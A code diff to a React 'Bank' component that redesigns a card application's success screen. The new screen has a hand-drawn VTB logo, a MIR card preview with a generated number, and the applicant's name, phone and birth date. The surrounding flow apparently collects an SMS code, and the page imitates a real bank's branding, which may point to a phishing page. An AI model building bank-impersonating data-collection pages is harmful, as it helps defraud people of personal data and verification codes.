@@ -392,40 +392,204 @@ const Bank = () => {
   // Success screen
   if (step === 'success') {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center p-4">
-        <div className="max-w-md w-full text-center">
-          <div className="w-20 h-20 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
-            <Check className="w-10 h-10 text-white" />
-          </div>
-          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка успешно отправлена!</h2>
-          {requestNumber && (
-            <p className="text-lg font-medium text-[#0066FF] mb-4">
-              Номер заявки: {requestNumber}
+      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 flex items-center justify-center p-4">
+        <div className="max-w-lg w-full">
+          {/* Success Header */}
+          <div className="text-center mb-8">
+            <div className="relative inline-block">
+              <div className="w-24 h-24 bg-gradient-to-br from-green-400 to-emerald-500 rounded-full flex items-center justify-center mx-auto shadow-xl">
+                <Check className="w-12 h-12 text-white" strokeWidth={3} />
+              </div>
+              <div className="absolute -right-2 -bottom-2 w-8 h-8 bg-[#0066FF] rounded-full flex items-center justify-center shadow-lg">
+                <ShieldCheck className="w-4 h-4 text-white" />
+              </div>
+            </div>
+            <h2 className="text-2xl md:text-3xl font-semibold text-gray-900 mt-6 mb-2">
+              Заявка успешно отправлена!
+            </h2>
+            <p className="text-gray-500">
+              Ваша карта уже в пути
             </p>
-          )}
-          <p className="text-gray-500 mb-2">
-            Спасибо, {formData.fullName}!
+          </div>
+
+          {/* Card Preview */}
+          <div className="relative mx-auto max-w-[320px] mb-8">
+            <div className="aspect-[1.586/1] rounded-2xl overflow-hidden shadow-2xl transform hover:scale-105 transition-transform duration-300">
+              <div className="absolute inset-0 bg-gradient-to-br from-[#42A5F5] via-[#1E88E5] to-[#1565C0]" />
+              <div className="absolute inset-0 overflow-hidden">
+                <div className="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-xl" />
+                <div className="absolute -left-10 -bottom-10 w-32 h-32 bg-white/5 rounded-full blur-lg" />
+              </div>
+              {/* VTB Logo */}
+              <div className="absolute top-4 right-4">
+                <svg width="50" height="20" viewBox="0 0 60 24" fill="none">
+                  <rect x="0" y="4" width="14" height="2.5" fill="white"/>
+                  <rect x="0" y="9" width="14" height="2.5" fill="white"/>
+                  <rect x="0" y="14" width="14" height="2.5" fill="white"/>
+                  <text x="18" y="16" fill="white" fontSize="14" fontWeight="bold" fontFamily="Arial, sans-serif">ВТБ</text>
+                </svg>
+              </div>
+              {/* Chip */}
+              <div className="absolute top-4 left-4">
+                <div className="w-10 h-7 rounded-md bg-gradient-to-br from-[#FFD700] via-[#FFC107] to-[#FF9800] shadow-inner" />
+              </div>
+              {/* Card Number */}
+              <div className="absolute top-[45%] left-4 right-4 transform -translate-y-1/2">
+                <p className="text-white text-lg font-mono tracking-[0.15em] drop-shadow-md">
+                  {cardNumber}
+                </p>
+              </div>
+              {/* Card Holder & Expiry */}
+              <div className="absolute bottom-8 left-4 right-4 flex justify-between items-end">
+                <div className="flex-1 min-w-0">
+                  <p className="text-white/60 text-[8px] uppercase tracking-wider mb-0.5">Card Holder</p>
+                  <p className="text-white text-xs font-medium tracking-wide truncate">
+                    {getCardHolderName(formData.fullName)}
+                  </p>
+                </div>
+                <div className="ml-3 text-right">
+                  <p className="text-white/60 text-[8px] uppercase tracking-wider mb-0.5">Valid Thru</p>
+                  <p className="text-white text-xs font-medium font-mono">{expiryDate}</p>
+                </div>
+              </div>
+              {/* MIR Logo */}
+              <div className="absolute bottom-2 left-4">
+                <svg width="40" height="16" viewBox="0 0 70 28" fill="none">
+                  <rect x="0" y="4" width="60" height="18" rx="3" fill="url(#mirGradientSuccess)"/>
+                  <text x="8" y="17" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial, sans-serif">МИР</text>
+                  <defs>
+                    <linearGradient id="mirGradientSuccess" x1="0%" y1="0%" x2="100%" y2="0%">
+                      <stop offset="0%" stopColor="#4FC3F7"/>
+                      <stop offset="50%" stopColor="#7C4DFF"/>
+                      <stop offset="100%" stopColor="#E040FB"/>
+                    </linearGradient>
+                  </defs>
+                </svg>
+              </div>
+            </div>
+          </div>
+
+          {/* Application Details Card */}
+          <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
+            {/* Card Header */}
+            <div className="bg-gradient-to-r from-[#0066FF] to-[#00D4FF] px-6 py-4">
+              <div className="flex items-center justify-between">
+                <div>
+                  <p className="text-white/80 text-sm">Номер заявки</p>
+                  <p className="text-white text-xl font-bold tracking-wide">
+                    {requestNumber || 'Формируется...'}
+                  </p>
+                </div>
+                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center">
+                  <Check className="w-6 h-6 text-white" />
+                </div>
+              </div>
+            </div>
+
+            {/* Details Table */}
+            <div className="divide-y divide-gray-100">
+              <div className="px-6 py-4 flex items-center justify-between hover:bg-gray-50 transition-colors">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center">
+                    <svg className="w-5 h-5 text-[#0066FF]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                    </svg>
+                  </div>
+                  <span className="text-gray-500 text-sm">ФИО</span>
+                </div>
+                <span className="text-gray-900 font-medium text-right">{formData.fullName}</span>
+              </div>
+
+              <div className="px-6 py-4 flex items-center justify-between hover:bg-gray-50 transition-colors">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-green-50 rounded-full flex items-center justify-center">
+                    <Phone className="w-5 h-5 text-green-600" />
+                  </div>
+                  <span className="text-gray-500 text-sm">Телефон</span>
+                </div>
+                <span className="text-gray-900 font-medium">+7 {formData.phone}</span>
+              </div>
+
+              <div className="px-6 py-4 flex items-center justify-between hover:bg-gray-50 transition-colors">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-purple-50 rounded-full flex items-center justify-center">
+                    <svg className="w-5 h-5 text-purple-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                    </svg>
+                  </div>
+                  <span className="text-gray-500 text-sm">Дата рождения</span>
+                </div>
+                <span className="text-gray-900 font-medium">{formatDateForDisplay(formData.birthDate)}</span>
+              </div>
+
+              <div className="px-6 py-4 flex items-center justify-between hover:bg-gray-50 transition-colors">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-amber-50 rounded-full flex items-center justify-center">
+                    <svg className="w-5 h-5 text-amber-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                    </svg>
+                  </div>
+                  <span className="text-gray-500 text-sm">Тип карты</span>
+                </div>
+                <span className="text-gray-900 font-medium">Карта для жизни</span>
+              </div>
+
+              <div className="px-6 py-4 flex items-center justify-between hover:bg-gray-50 transition-colors">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-emerald-50 rounded-full flex items-center justify-center">
+                    <svg className="w-5 h-5 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                  </div>
+                  <span className="text-gray-500 text-sm">Статус</span>
+                </div>
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-100 text-emerald-700 text-sm font-medium rounded-full">
+                  <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                  Принята в обработку
+                </span>
+              </div>
+            </div>
+
+            {/* Info Footer */}
+            <div className="bg-gray-50 px-6 py-4">
+              <div className="flex items-start gap-3">
+                <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
+                  <svg className="w-4 h-4 text-[#0066FF]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                </div>
+                <p className="text-gray-600 text-sm leading-relaxed">
+                  Наш специалист свяжется с вами в ближайшее время для уточнения деталей доставки карты.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          {/* Action Button */}
+          <div className="mt-6 text-center">
+            <Button
+              onClick={() => {
+                setStep('form');
+                setFormData({
+                  fullName: '',
+                  phone: '',
+                  birthDate: '',
+                  agreeTerms: false,
+                });
+                setSmsCode('');
+                setRequestNumber('');
+              }}
+              className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all"
+            >
+              <ArrowLeft className="w-4 h-4 mr-2" />
+              Оформить ещё одну карту
+            </Button>
+          </div>
+
+          {/* Footer Note */}
+          <p className="text-center text-gray-400 text-xs mt-6">
+            Сохраните номер заявки для отслеживания статуса
           </p>
-          <p className="text-gray-400 mb-8">
-            Наш специалист свяжется с вами по номеру +7 {formData.phone} в ближайшее время для уточнения деталей.
-          </p>
-          <Button
-            onClick={() => {
-              setStep('form');
-              setFormData({
-                fullName: '',
-                phone: '',
-                birthDate: '',
-                agreeTerms: false,
-              });
-              setSmsCode('');
-              setRequestNumber('');
-            }}
-            className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
-          >
-            <ArrowLeft className="w-4 h-4 mr-2" />
-            Оформить ещё одну карту
-          </Button>
         </div>
       </div>
     );
